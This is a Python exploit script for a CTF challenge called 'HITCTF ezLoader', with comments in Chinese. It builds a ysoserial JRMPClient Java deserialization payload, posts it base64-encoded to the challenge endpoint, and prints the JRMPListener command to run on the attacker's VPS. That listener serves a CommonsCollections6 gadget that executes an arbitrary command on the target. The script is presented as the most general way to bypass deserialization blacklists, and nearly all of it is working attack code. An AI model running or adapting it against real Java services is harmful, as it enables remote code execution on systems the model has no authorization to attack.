#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HITCTF ezLoader - JRMPClient 利用方法
这是最通用的绕过黑名单方法

原理:
1. 目标反序列化 JRMPClient payload
2. 目标主动连接到攻击者的 RMI 服务
3. 攻击者 RMI 服务返回恶意对象（可以是任意 gadget）
4. 目标反序列化恶意对象并执行

优势:
- 绕过大多数黑名单（JRMPClient 本身是 JDK 原生类）
- 不需要目标服务器有任何外部依赖
- 可以使用任意 gadget（在攻击者服务端生成）
"""

import requests
import base64
import subprocess
import sys
import threading
import time

TARGET_URL = "http://5bd9497ae8ad.target.yijinglab.com/unser"

def generate_jrmpclient_payload(vps_ip, vps_port):
    """生成 JRMPClient payload"""
    print(f"[*] 生成 JRMPClient payload: {vps_ip}:{vps_port}")
    
    java_opts = [
        "--add-opens=java.base/java.net=ALL-UNNAMED",
        "--add-opens=java.base/java.util=ALL-UNNAMED",
        "--add-opens=java.rmi/sun.rmi.server=ALL-UNNAMED"
    ]
    
    try:
        result = subprocess.run(
            ["java"] + java_opts + ["-jar", "ysoserial.jar", "JRMPClient", f"{vps_ip}:{vps_port}"],
            capture_output=True,
            timeout=10
        )
        
        if result.returncode != 0:
            print(f"[!] 生成失败: {result.stderr.decode('utf-8', errors='ignore')[:200]}")
            return None
        
        print(f"[+] Payload 生成成功 ({len(result.stdout)} 字节)")
        return result.stdout
        
    except Exception as e:
        print(f"[!] 错误: {e}")
        return None


def start_jrmp_listener(port, command):
    """启动 JRMPListener 服务 (需要在 VPS 上运行)"""
    print(f"\n{'='*60}")
    print(f"  在 VPS 上运行以下命令启动监听服务:")
    print(f"{'='*60}")
    print(f"\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener {port} CommonsCollections6 '{command}'")
    print(f"\n或使用其他 gadget (如果目标有对应依赖):")
    print(f"  - CommonsCollections6 (需要 commons-collections)")
    print(f"  - Jdk7u21 (无依赖，需要 JDK <= 7u21)")
    print(f"\n{'='*60}\n")


def exploit(payload_bytes):
    """发送 payload"""
    payload_b64 = base64.b64encode(payload_bytes).decode()
    
    print(f"[*] 发送 payload 到: {TARGET_URL}")
    
    try:
        response = requests.post(
            TARGET_URL,
            data={"data": payload_b64},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        
        if response.status_code == 500:
            print(f"[!] 服务器返回 500")
            print(f"    这可能是正常的（目标正在连接 RMI 服务）")
            print(f"    请检查 VPS 监听器是否收到连接")
        else:
            print(f"[+] 响应内容: {response.text[:300]}")
        
        return response
        
    except requests.exceptions.Timeout:
        print("[!] 请求超时")
        print("    这可能意味着目标正在尝试连接 RMI 服务")
        return None
    except Exception as e:
        print(f"[!] 请求错误: {e}")
        return None


def main():
    print("=" * 60)
    print("  HITCTF ezLoader - JRMPClient 利用")
    print("  最通用的反序列化绕过方法")
    print("=" * 60)
    print()
    
    # 获取配置
    if len(sys.argv) >= 3:
        vps_ip = sys.argv[1]
        vps_port = sys.argv[2]
        command = sys.argv[3] if len(sys.argv) > 3 else "whoami"
    else:
        vps_ip = input("请输入 VPS 公网 IP: ").strip()
        vps_port = input("请输入监听端口 (默认 1099): ").strip() or "1099"
        command = input("请输入要执行的命令 (默认 whoami): ").strip() or "whoami"
    
    if not vps_ip:
        print("[!] VPS IP 不能为空")
        return
    
    print(f"\n[*] 配置:")
    print(f"    VPS: {vps_ip}:{vps_port}")
    print(f"    命令: {command}")
    print()
    
    # 显示服务端启动命令
    start_jrmp_listener(vps_port, command)
    
    input("⚠️  请确保在 VPS 上已启动 JRMPListener，按回车继续...")
    
    # 生成 payload
    payload = generate_jrmpclient_payload(vps_ip, vps_port)
    if not payload:
        return
    
    # 发送 payload
    print()
    exploit(payload)
    
    print("\n" + "=" * 60)
    print("📝 预期流程:")
    print("  1. 目标服务器反序列化 JRMPClient")
    print("  2. 目标连接到你的 VPS RMI 服务")
    print("  3. VPS 返回恶意 gadget (CommonsCollections6/Jdk7u21)")
    print("  4. 目标反序列化恶意对象并执行命令")
    print("  5. 查看 VPS 上的 JRMPListener 输出")
    print()
    print("⚠️  注意:")
    print("  - 如果目标无法连接外网，此方法无效")
    print("  - 确保 VPS 防火墙开放了监听端口")
    print("  - JRMPListener 需要 ysoserial.jar")
    print("=" * 60)


if __name__ == "__main__":
    main()
